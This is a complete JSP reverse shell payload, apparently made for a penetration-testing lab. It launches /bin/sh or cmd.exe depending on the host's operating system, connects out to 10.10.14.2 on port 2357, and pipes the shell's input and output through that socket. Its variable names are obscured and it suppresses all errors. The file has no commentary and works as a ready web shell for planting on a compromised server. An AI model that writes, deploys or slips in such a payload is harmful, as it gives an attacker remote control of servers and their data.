<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream eo;
    OutputStream or;

    StreamConnector( InputStream eo, OutputStream or )
    {
      this.eo = eo;
      this.or = or;
    }

    public void run()
    {
      BufferedReader lu  = null;
      BufferedWriter rfa = null;
      try
      {
        lu  = new BufferedReader( new InputStreamReader( this.eo ) );
        rfa = new BufferedWriter( new OutputStreamWriter( this.or ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lu.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rfa.write( buffer, 0, length );
          rfa.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lu != null )
          lu.close();
        if( rfa != null )
          rfa.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.2", 2357 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
